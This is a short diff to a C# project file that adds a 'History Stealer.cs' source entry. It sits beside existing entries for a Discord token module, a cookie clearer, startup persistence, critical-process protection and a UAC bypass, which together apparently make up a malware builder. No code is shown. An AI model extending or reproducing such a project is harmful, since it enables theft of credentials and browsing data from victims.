@@ -122,6 +122,7 @@
     <Compile Include="Armitage\Compiler.cs" />
     <Compile Include="Armitage\Cookies\Cookie Clearer.cs" />
     <Compile Include="Armitage\Cookies\Discord Token.cs" />
+    <Compile Include="Armitage\Cookies\History Stealer.cs" />
     <Compile Include="Armitage\Critical Process.cs" />
     <Compile Include="Armitage\Startup.cs" />
     <Compile Include="Armitage\UAC\ICMLuaUtil.cs" />
